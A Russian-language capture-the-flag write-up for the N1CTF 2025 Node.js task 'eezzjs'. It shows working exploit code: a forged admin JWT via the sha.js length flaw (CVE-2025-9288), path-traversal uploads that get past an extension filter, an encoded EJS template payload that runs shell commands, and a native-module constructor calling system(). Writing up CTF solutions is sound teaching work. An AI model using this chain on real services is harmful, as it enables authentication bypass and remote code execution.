# eezzjs
**N1CTF 2025**

Даны исходники сервиса на Node.js, нужно получить к файлу с флагом `/ffffffflag`. Сервис позволяет загружать файлы в директорию `./uploads`, но сделать это можно только авторизовавшись под единственной учеткой: `admin`. Создать новую учетку нельзя, а пароль от `admin` неизвестен. Разберемся как происхоит авторизация.

В сервисе для авторизации пользователя используется JWT токен, которые генерируется необычным образом:

    const sha = require('sha.js');  // используется пакет sha.js
    
    const sha256 = (...messages) => {
        const hash = sha('sha256');
        messages.forEach((m) => hash.update(m));    // для каждого элемента вызывается функция update
        return hash.digest('hex');
    };
    ...
    const signJWT = (payload, { expiresIn } = {}, secret = JWT_SECRET) => {
        const header = { alg: 'HS256', typ: 'JWT' };
        const now = Math.floor(Date.now() / 1000);
        console.log(payload)
        const body = { ...payload, length:payload.username.length,iat: now };
        if (expiresIn) {
            body.exp = now + expiresIn;
        }
    
        return [
            toBase64Url(JSON.stringify(header)),
            toBase64Url(JSON.stringify(body)),
            sha256(...[JSON.stringify(header), body, secret])    // header и secret передаются строкой, а body как объект
        ].join('.');
    };
    
    const verifyJWT = (token, secret = JWT_SECRET) => {
        if (typeof token !== 'string') {
            return null;
        }
    
        const parts = token.split('.');
        if (parts.length !== 3) {
            return null;
        }
    
        const [encodedHeader, encodedPayload, signature] = parts;
    
        let header;
        let payload;
        try {
            header = JSON.parse(fromBase64Url(encodedHeader).toString());
            payload = JSON.parse(fromBase64Url(encodedPayload).toString());
        } catch (err) {
            return null;
        }
    
        const expectedSignatureHex = sha256(...[JSON.stringify(header), payload, secret]);  // аналогично, header и secret - строки, payload - объект
    
        let providedSignature;
        let expectedSignature;
        try {
            providedSignature = Buffer.from(signature, 'hex');
            expectedSignature = Buffer.from(expectedSignatureHex, 'hex');
        } catch (err) {
            return null;
        }
    
        if (
            providedSignature.length !== expectedSignature.length ||
            !crypto.timingSafeEqual(providedSignature, expectedSignature)
        ) {
            return null;
        }
    
        if (header.alg !== 'HS256') {
            return null;
        }
    
        if (payload.exp && Math.floor(Date.now() / 1000) >= payload.exp) {
            return null;
        }
    
        return payload;
    };

Для генерации подписи используется пакет ``sha.js``. Посмотрев его версию в ``package.json`` или выполнив npm audit можно найти CVE-2025-9288. Уязвимость позволяет манипулировать функцией update в хешировании. Передав в update объект с полем ``length``, можно переопределить длину текста для хэширования. Если сделать длину текста равной 0, то вернется хэш от пустого сообщения, - а он всегда одинаковый.

    Hash.prototype.update = function (data, enc) {
      if (typeof data === 'string') {
        enc = enc || 'utf8'
        data = Buffer.from(data, enc)
      }
    
      var block = this._block
      var blockSize = this._blockSize
      var length = data.length     // переменная length инициализируется значением length из объекта data
      var accum = this._len
    
      for (var offset = 0; offset < length;) {
        var assigned = accum % blockSize
        var remainder = Math.min(length - offset, blockSize - assigned)
    
        for (var i = 0; i < remainder; i++) {
          block[assigned + i] = data[offset + i]
        }
    
        accum += remainder
        offset += remainder
    
        if ((accum % blockSize) === 0) {
          this._update(block)
        }
      }
    
      this._len += length    // можно передать такое значение length, чтобы сумма была равна 0
      return this
    }

[Подробнее про CVE-2025-9288](https://github.com/browserify/sha.js/security/advisories/GHSA-95m3-7q98-8xr5)

Пример кода для создания JWT для байпасса авторизации:

    const header = {
        "typ": "JWT",
        "alg": "HS256"
    };
    var payload = {
        "exp": 9999999999,
        "username": "admin",
        "length": -45    // сумма длины строки header и длины secret. payload не учитываем, тк он будет передаваться в хэш как объект
    };
    const secret = 'a'.repeat(18);
    console.log(sha256(...[JSON.stringify(header), payload, secret]));

Теперь у нас есть возможность загружать любые файлы на сервер. Покопавшись в коде сервиса или отдав эту работу GPT можно найти SSTI:

    function serveIndex(req, res) {
        var templ = req.query.templ || 'index';    // берем файл из query параметра templ
        var lsPath = path.join(__dirname, req.path);
        try {
            res.render(templ, {         // и рендерим его
                filenames: fs.readdirSync(lsPath),
                path: req.path
            });
        } catch (e) {
            console.log(e);
            res.status(500).send('Error rendering page');
        }
    }

Грузим ваш любимый SSTI payload для чтения файлов (или переменных окружения) и получаем флаг. Нюанс: в коде есть проверка, что имя файла не содержит `js`. Однако, его легко обойти, тк проверяется только расширение файла, то есть то, что стоит за последней точкой после последного `/`

    var ext = path.extname(filename).toLowerCase();
    
    if (/js/i.test(ext)) {
        return  res.status(403).send('Denied filename');
    }

Загрузить файл нужно в директорию `/app/views`, поэтому нужно еще обойти `path.join` - это делается стандартным Path Traversal. Были следующие решения по обходу фильтра на `js`:
1. добавление `/a/..` в конец имени файла
`filename:"../views/exp.ejs/a/.." // доступ к файлу ?templ=/app/views/exp.ejs`
2. внезапный вариант с `.ejs`
`filename:"../views/.ejs"      // доступ к файлу ?templ=/app/views/`
3. загрузка нового модуля в `node_modules`:
`{"filename":"../views/pwned.pwned","filedata":"dGVzdAo="}`
`{"filename":"../node_modules/pwned","filedata":"ZnVuY3Rpb24gX19leHByZXNzKCkgewogICAgY29uc29sZS5sb2coJ3B3bmVkYicpOwp9Cgptb2R1bGUuZXhwb3J0cyA9IHsgX19leHByZXNzIH07"}`
вызов `/?templ=pwned.pwned`
4. загрузка `.node` файла
это [документированная фича](https://nodejs.org/api/modules.html) Node.js

> If the exact filename is not found, then Node.js will attempt to load
> the required filename with the added extensions: .js, .json, and
> finally .node. When loading a file that has a different extension
> (e.g. .cjs), its full name must be passed to require(), including its
> file extension (e.g. require('./file.cjs')).

Для этого можно сбилдить вот такой файл:

    #include <stdio.h>
    #include <stdlib.h>
    __attribute__((constructor)) void abc(){
        system("cp /ffffffflag > /app/uploads/flag.txt");
    }

    npm install node-gyp && ./node_modules/.bin/node-gyp configure && ./node_modules/.bin/node-gyp build

Почти никто не решил задание по четвертому вектору, в основном, решали по одному из первых двух. Пример полного JSON с SSTI для чтения флага из файла:

    {'filename': '../views/.ejs', 'filedata': 'CjwlCiAgY29uc3QgY3AgPSAoRnVuY3Rpb24oJ3JldHVybiBwcm9jZXNzJykpKCkubWFpbk1vZHVsZS5yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJyk7CiAgY29uc3QgZGF0YSA9IGNwLmV4ZWNTeW5jKCdjYXQgL2ZmZmZmZmZsYWcnLCAndXRmOCcpOwolPgo8cHJlPjwlPSBkYXRhICU+PC9wcmU+Cg=='}

#web #node #jwt #ssti